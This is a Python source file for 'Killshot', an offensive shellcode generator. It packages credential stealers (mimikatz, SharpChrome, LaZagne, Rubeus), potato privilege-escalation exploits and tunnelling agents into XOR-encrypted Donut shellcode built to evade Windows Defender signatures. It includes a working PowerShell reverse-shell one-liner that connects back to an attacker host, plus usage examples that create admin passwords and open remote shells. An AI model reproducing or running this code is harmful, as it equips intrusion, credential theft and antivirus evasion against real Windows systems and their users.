#!/usr/bin/env python3
"""
Killshot - Offensive Tool Shellcode Generator
Converts .NET assemblies and native PEs to Donut shellcode for runner.exe loading.
All output is runner.exe-compatible (.enc base64 shellcode).

Usage:
  killshot.py --tool SharpHound --params "-c All" -o /workspace/sharphound.enc
  killshot.py --tool ligolo-agent --params "-connect 10.99.0.16:11601 -ignore-cert" -o /workspace/ligolo.enc
  killshot.py --list
  killshot.py --all --lhost 10.99.0.16 -w /workspace
"""

import argparse
import base64
import json
import os
import subprocess
import sys
import tempfile

# Search order: local tools/, /opt/killshot (kali), exegol paths, script_dir fallback
def _win_paths(name):
    return [
        "{script_dir}/tools/windows/" + name,
        "/opt/killshot/tools/windows/" + name,
        "/opt/my-resources/tools/windows/" + name,
        "{script_dir}/" + name,
    ]

def _pot_paths(name):
    return [
        "{script_dir}/tools/potatoes/" + name,
        "/opt/killshot/tools/potatoes/" + name,
        "/opt/my-resources/tools/potatoes/" + name,
        "{script_dir}/" + name,
    ]

# Tool definitions: name → (search paths, default params, description)
TOOLS = {
    "Rubeus": {
        "paths": [
            "{script_dir}/tools/windows/Rubeus.exe",
            "/opt/killshot/tools/windows/Rubeus.exe",
            "/opt/my-resources/tools/windows/Rubeus.exe",
            "/opt/my-resources/setup/sliver/.sliver-client/aliases/rubeus/Rubeus.exe",
            "{script_dir}/Rubeus.exe",
        ],
        "default_params": "triage",
        "desc": "Kerberos abuse toolkit",
    },
    "SharpHound": {
        "paths": _win_paths("SharpHound.exe"),
        "default_params": "-c All --memcache",
        "desc": "BloodHound collector",
    },
    "Certify": {
        "paths": _win_paths("Certify.exe"),
        "default_params": "find /vulnerable",
        "desc": "AD CS enumeration",
    },
    "Seatbelt": {
        "paths": _win_paths("Seatbelt.exe"),
        "default_params": "-group=all -full",
        "desc": "Host survey / privesc checks",
    },
    "SharpDPAPI": {
        "paths": _win_paths("SharpDPAPI.exe"),
        "default_params": "triage",
        "desc": "DPAPI credential extraction",
    },
    "SharpUp": {
        "paths": _win_paths("SharpUp.exe"),
        "default_params": "audit",
        "desc": "Privilege escalation checks",
    },
    "SharpChrome": {
        "paths": _win_paths("SharpChrome.exe"),
        "default_params": "logins",
        "desc": "Chrome credential extraction",
    },
    "winPEAS": {
        "paths": [
            "{script_dir}/tools/windows/winPEAS.exe",
            "/opt/my-resources/tools/windows/winPEAS.exe",
            "/opt/my-resources/tools/windows/winPEASx64.exe",
            "{script_dir}/winPEAS.exe",
        ],
        # No args = full output (5.4MB confirmed). "quiet" flag causes crash at end.
        # Runner MUST use create_thread with 32MB stack (--injection create_thread).
        "default_params": "",
        "desc": "Windows privilege escalation scanner",
    },
    "Whisker": {
        "paths": _win_paths("Whisker.exe"),
        "default_params": "list",
        "desc": "Shadow Credentials attack",
    },
    "KrbRelayUp": {
        "paths": _win_paths("KrbRelayUp.exe"),
        "default_params": "relay",
        "desc": "Kerberos relay privilege escalation",
    },
    "ligolo-agent": {
        "paths": _win_paths("ligolo-agent.exe"),
        "default_params": "",  # MUST be set via --params (needs -connect host:port)
        "desc": "Ligolo-ng tunneling agent (native PE)",
    },
    "chisel": {
        "paths": [
            "{script_dir}/tools/windows/chisel.exe",
            "/opt/killshot/tools/windows/chisel.exe",
            "/opt/resources/windows/chisel/chisel64.exe",
            "/opt/my-resources/tools/windows/chisel.exe",
            "{script_dir}/chisel.exe",
        ],
        "default_params": "",  # MUST be set via --params (needs client HOST:PORT R:socks)
        "desc": "Chisel tunneling client (native PE)",
    },
    "mimikatz": {
        "paths": [
            "{script_dir}/tools/windows/mimikatz.exe",
            "/opt/killshot/tools/windows/mimikatz.exe",
            "/opt/my-resources/tools/windows/mimikatz.exe",
            "/opt/resources/windows/mimikatz/x64/mimikatz.exe",
            "{script_dir}/mimikatz.exe",
        ],
        # sekurlsa::logonpasswords blocked by RunAsPPL=2 on Win11.
        # lsadump::sam requires SYSTEM — run via scheduled task (see gen_tool_stager.py).
        "default_params": "lsadump::sam exit",
        "desc": "Credential extraction — SAM dump requires SYSTEM scheduled task",
    },
    "lazagne": {
        "paths": [
            "{script_dir}/tools/windows/lazagne.exe",
            "/opt/killshot/tools/windows/lazagne.exe",
            "/opt/my-resources/tools/windows/lazagne.exe",
            "/opt/resources/windows/LaZagne/lazagne.exe",
        ],
        "default_params": "all",
        "desc": "Multi-browser/app credential extraction",
    },
    "RunasCs": {
        "paths": _win_paths("RunasCs.exe"),
        "default_params": "",  # requires: user pass cmd [opts]
        "desc": "Runas with creds — no interactive session needed",
    },
    "Snaffler": {
        "paths": _win_paths("Snaffler.exe"),
        "default_params": "-s -o snaffler.log",
        "desc": "SMB share credential/secret file hunter",
    },
    "SQLRecon": {
        "paths": _win_paths("SQLRecon.exe"),
        "default_params": "/enum:sqlspns",
        "desc": "MSSQL enumeration and command execution",
    },
    "SharpGPOAbuse": {
        "paths": _win_paths("SharpGPOAbuse.exe"),
        "default_params": "--AddComputerTask --TaskName Update --Author DOMAIN\\Admin --Command cmd.exe --Arguments '/c whoami'",
        "desc": "GPO-based lateral movement / persistence",
    },
    "ADSearch": {
        "paths": _win_paths("ADSearch.exe"),
        "default_params": "--search \"(objectCategory=user)\" --attributes samaccountname,memberof",
        "desc": "Targeted LDAP queries (faster than SharpHound for single lookups)",
    },
}


def find_tool(name, script_dir):
    info = TOOLS.get(name)
    if not info:
        return None
    for p in info["paths"]:
        p = p.format(script_dir=script_dir)
        if os.path.isfile(p):
            return p
    return None


POTATOES = {
    "GodPotato": {
        "paths": _pot_paths("GodPotato.exe"),
        "cmd_template": '-cmd "{cmd}"',
        "desc": "SeImpersonate→SYSTEM via RPC | Win10/11, Server 2012-2022",
        "requires": "SeImpersonatePrivilege",
    },
    "PrintSpoofer": {
        "paths": _pot_paths("PrintSpoofer.exe"),
        "cmd_template": '-i -c "{cmd}"',
        "desc": "SpoolFool → SYSTEM | Win10, Server 2016-2022",
        "requires": "SeImpersonatePrivilege",
    },
    "JuicyPotatoNG": {
        "paths": _pot_paths("JuicyPotatoNG.exe"),
        "cmd_template": '-t * -p "cmd.exe" -a "/c {cmd}"',
        "desc": "COM hijack → SYSTEM, no BITS needed | Win10/11, Server 2019/2022",
        "requires": "SeImpersonatePrivilege",
    },
    "SweetPotato": {
        "paths": _pot_paths("SweetPotato.exe"),
        "cmd_template": '-e EfsPotato -p "cmd.exe" -a "/c {cmd}"',
        "desc": "Multi-technique (EfsPotato+PrintSpoofer) → SYSTEM | Win10, Server 2016-2022",
        "requires": "SeImpersonatePrivilege",
    },
    "BadPotato": {
        "paths": _pot_paths("BadPotato.exe"),
        "cmd_template": '"{cmd}"',
        "desc": "Named pipe SeImpersonate → SYSTEM | Win10, Server 2016-2019",
        "requires": "SeImpersonatePrivilege",
    },
    "EfsPotato": {
        "paths": _pot_paths("EfsPotato.exe"),
        "cmd_template": '"{cmd}"',
        "desc": "EFS RPC → SYSTEM | Win10, Server 2016-2019",
        "requires": "SeImpersonatePrivilege",
    },
}


def find_donut_python():
    for pypath in ["/opt/tools/Empire/venv/bin/python3", sys.executable]:
        if os.path.isfile(pypath):
            try:
                result = subprocess.run(
                    [pypath, "-c", "import donut"],
                    capture_output=True, timeout=5
                )
                if result.returncode == 0:
                    return pypath
            except Exception:
                continue
    return None


def gen_ps_revshell(lhost, lport):
    """Generate a PS reverse shell one-liner encoded for -enc flag."""
    ps = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        "$s=$c.GetStream();"
        "[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);"
        "$r2=$r+'PS '+(pwd).Path+'> ';"
        "$sb=([text.encoding]::ASCII).GetBytes($r2);"
        "$s.Write($sb,0,$sb.Length);$s.Flush()};"
        "$c.Close()"
    )
    enc = base64.b64encode(ps.encode('utf-16-le')).decode()
    return f"powershell -nop -w hidden -enc {enc}"


def find_potato(name, script_dir):
    info = POTATOES.get(name)
    if not info:
        return None
    for p in info["paths"]:
        p = p.format(script_dir=script_dir)
        if os.path.isfile(p):
            return p
    return None


def generate(tool_name, params, output_path, script_dir, exe_path=None):
    if exe_path:
        tool_path = os.path.abspath(exe_path)
        if not os.path.isfile(tool_path):
            print(f"[!] File not found: {tool_path}")
            return False
    else:
        tool_path = find_tool(tool_name, script_dir)
        if not tool_path:
            print(f"[!] {tool_name} not found")
            return False
        tool_path = os.path.abspath(tool_path)
        info = TOOLS[tool_name]
        if not params:
            params = info["default_params"]

    print(f"[*] Tool: {tool_path}")
    print(f"[*] Params: {params or '(none)'}")

    donut_py = find_donut_python()
    if not donut_py:
        print("[!] Donut not found")
        return False

    with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as tmp:
        tmp_path = tmp.name

    donut_code = f"""
import donut, os, tempfile
os.chdir(tempfile.gettempdir())
sc = donut.create(file={json.dumps(tool_path)}, arch=2, params={json.dumps(params)}, exit_opt=2)
if sc:
    with open({json.dumps(tmp_path)}, 'wb') as f:
        f.write(sc)
    print(f'OK {{len(sc)}}')
else:
    print('FAIL')
"""

    result = subprocess.run(
        [donut_py, "-c", donut_code],
        capture_output=True, text=True, timeout=60
    )

    output = result.stdout.strip()
    if not output.startswith('OK'):
        print(f"[!] Donut failed: {result.stderr}")
        try:
            os.unlink(tmp_path)
        except OSError:
            pass
        return False

    sc_size = output.split()[1]
    print(f"[+] Shellcode: {sc_size} bytes")

    with open(tmp_path, 'rb') as f:
        sc_data = f.read()
    os.unlink(tmp_path)

    # XOR-encrypt shellcode with a random key before base64.
    # Format: base64(key_byte || xor_encrypted_shellcode)
    # Runner reads key from first decoded byte, decrypts the rest.
    # Breaks static donut signatures in both the .enc file and in-memory before decryption.
    import random as _rand
    sc_key = _rand.randint(1, 254)
    sc_encrypted = bytes([sc_key] + [b ^ sc_key for b in sc_data])
    b64_data = base64.b64encode(sc_encrypted)
    with open(output_path, 'wb') as f:
        f.write(b64_data)

    # Also write XOR-0x5A encoded .dat file for safe HTTP transfer.
    # Windows Defender's network protection flags raw PE/shellcode bytes in transit;
    # XOR encoding avoids that signature. Runner download chain decodes on target.
    dat_path = output_path.rsplit('.enc', 1)[0] + '.dat'
    xor_data = bytes(b ^ 0x5A for b in b64_data)
    with open(dat_path, 'wb') as f:
        f.write(xor_data)

    print(f"[+] Generated: {output_path} ({len(b64_data)} bytes)")
    print(f"[+] XOR dat:   {dat_path} ({len(xor_data)} bytes)")
    return True


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Killshot — Offensive Tool Shellcode Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Built-in tools
  killshot.py --tool SharpHound --params "-c All" -o sharphound.enc
  killshot.py --tool ligolo-agent --lhost 10.0.0.1 -o ligolo.enc

  # Potato privesc — command execution
  killshot.py --potato GodPotato --cmd "net user administrator Password123!"
  killshot.py --potato PrintSpoofer --cmd "cmd /c whoami > C:\\\\Temp\\\\out.txt"

  # Potato privesc — reverse shell (auto-generated PS revshell)
  killshot.py --potato GodPotato --reverse-shell --lhost 10.0.0.1 --lport 4444
  killshot.py --potato JuicyPotatoNG --reverse-shell --lhost 10.0.0.1 --lport 4444

  # Custom exe — convert any .exe to shellcode
  killshot.py --exe /path/to/tool.exe --params "-arg value" -o tool.enc
  killshot.py --exe /path/to/GodPotato.exe --cmd "whoami" --template '-cmd "{cmd}"'
  killshot.py --exe /path/to/tool.exe --reverse-shell --lhost 10.0.0.1 --lport 4444 --template '-c "{cmd}"'
"""
    )

    # Source: tool, potato, or custom exe
    src = parser.add_mutually_exclusive_group()
    src.add_argument('--tool', '-t', help='Built-in tool name (see --list)')
    src.add_argument('--potato', choices=list(POTATOES.keys()),
                     help='Potato exploit (see --list)')
    src.add_argument('--exe', help='Path to any .exe to convert to shellcode')

    # Param sources (mutually exclusive)
    pgrp = parser.add_mutually_exclusive_group()
    pgrp.add_argument('--params', '-p', default=None,
                      help='Raw args passed to the tool via donut (overrides defaults)')
    pgrp.add_argument('--cmd', default=None,
                      help='Command to execute (formatted via tool cmd_template)')
    pgrp.add_argument('--reverse-shell', action='store_true',
                      help='Auto-generate PS reverse shell as the command')

    # Reverse shell / template options
    parser.add_argument('--lhost', default=None,
                        help='Attacker IP (reverse shell or ligolo connect-back)')
    parser.add_argument('--lport', default='4444',
                        help='Reverse shell port (default: 4444)')
    parser.add_argument('--template', default=None,
                        help='Arg template for --cmd/--reverse-shell with --exe (e.g. \'--cmd "{cmd}"\')')

    # Output / misc
    parser.add_argument('--output', '-o', default=None, help='Output .enc file path')
    parser.add_argument('--script-dir', '-s', default='.', help='Script directory')
    parser.add_argument('--list', action='store_true', help='List all tools and potatoes')
    parser.add_argument('--list-potatoes', action='store_true', help='List potato exploits')
    parser.add_argument('--all', '-a', action='store_true',
                        help='Generate all available built-in tools')
    parser.add_argument('--ligolo-port', default='11601',
                        help='Ligolo listener port (default: 11601)')
    parser.add_argument('--workspace', '-w', default='/workspace',
                        help='Output directory for --all mode')
    args = parser.parse_args()

    script_dir = args.script_dir or os.path.dirname(os.path.abspath(__file__))

    # ── --list ──────────────────────────────────────────────────
    if args.list or args.list_potatoes:
        if args.list:
            print("\nBuilt-in tools (--tool):")
            for name, info in TOOLS.items():
                path = find_tool(name, script_dir)
                status = f"found: {path}" if path else "NOT FOUND"
                print(f"  {name:15s} - {info['desc']:45s} [{status}]")

        print("\nPotato exploits (--potato):")
        for name, info in POTATOES.items():
            path = find_potato(name, script_dir)
            status = f"found: {path}" if path else "NOT FOUND"
            print(f"  {name:15s} - {info['desc']}")
            print(f"  {'':15s}   Requires: {info['requires']:30s} [{status}]")
            print(f"  {'':15s}   Template: {info['cmd_template']}")

        print("\nUsage examples:")
        print("  killshot.py --potato GodPotato --cmd \"net user administrator Password123!\"")
        print("  killshot.py --potato GodPotato --reverse-shell --lhost 10.0.0.1 --lport 4444")
        print("  killshot.py --exe /path/custom.exe --params \"-arg value\"")
        print("  killshot.py --exe /path/potato.exe --cmd \"whoami\" --template '-cmd \"{cmd}\"'")
        sys.exit(0)

    # ── --all (built-in tools only) ─────────────────────────────
    if args.all:
        ws = args.workspace
        ok = 0
        fail = 0
        for name in TOOLS:
            lower = name.lower().replace("-", "_")
            out = os.path.join(ws, f"{lower}.enc")
            params = args.params

            if name == "ligolo-agent":
                if not args.lhost:
                    print(f"[!] Skipping ligolo-agent (need --lhost)")
                    fail += 1
                    continue
                params = params or f"-connect {args.lhost}:{args.ligolo_port} -ignore-cert"

            if generate(name, params, out, script_dir):
                ok += 1
            else:
                fail += 1
        print(f"\n[*] Done: {ok} generated, {fail} failed/skipped")
        sys.exit(0 if fail == 0 else 1)

    # ── Resolve cmd string ───────────────────────────────────────
    cmd_str = None
    if args.reverse_shell:
        if not args.lhost:
            print("[!] --reverse-shell requires --lhost")
            sys.exit(1)
        cmd_str = gen_ps_revshell(args.lhost, int(args.lport))
        print(f"[*] Reverse shell: {args.lhost}:{args.lport}")
    elif args.cmd:
        cmd_str = args.cmd

    # ── --potato ────────────────────────────────────────────────
    if args.potato:
        info = POTATOES[args.potato]
        potato_path = find_potato(args.potato, script_dir)
        if not potato_path:
            print(f"[!] {args.potato}.exe not found — run: ./install.sh --tools-only")
            sys.exit(1)
        if not cmd_str:
            print(f"[!] --potato requires --cmd or --reverse-shell")
            print(f"    Template: {info['cmd_template']}")
            sys.exit(1)
        params = info["cmd_template"].format(cmd=cmd_str)
        output = args.output or f"{args.potato.lower()}.enc"
        print(f"[*] Potato: {args.potato} | Requires: {info['requires']}")
        if not generate(args.potato, params, output, script_dir, exe_path=potato_path):
            sys.exit(1)
        sys.exit(0)

    # ── --exe ────────────────────────────────────────────────────
    if args.exe:
        exe_path = args.exe
        if not os.path.isfile(exe_path):
            print(f"[!] File not found: {exe_path}")
            sys.exit(1)

        if cmd_str is not None:
            if args.template:
                params = args.template.format(cmd=cmd_str)
            else:
                params = cmd_str
        else:
            params = args.params  # may be None for tools that take no args

        output = args.output or (os.path.splitext(os.path.basename(exe_path))[0] + ".enc")
        if not generate(None, params, output, script_dir, exe_path=exe_path):
            sys.exit(1)
        sys.exit(0)

    # ── --tool (existing) ────────────────────────────────────────
    if not args.tool:
        parser.print_help()
        sys.exit(1)

    if args.tool not in TOOLS:
        print(f"[!] Unknown tool: {args.tool}")
        print(f"    Available: {', '.join(TOOLS.keys())}")
        sys.exit(1)

    params = args.params
    if args.tool == "ligolo-agent" and not params:
        if args.lhost:
            params = f"-connect {args.lhost}:{args.ligolo_port} -ignore-cert"
        else:
            print("[!] ligolo-agent requires --params or --lhost for connect-back")
            sys.exit(1)

    output = args.output or f"{args.tool.lower()}.enc"
    if not generate(args.tool, params, output, script_dir):
        sys.exit(1)
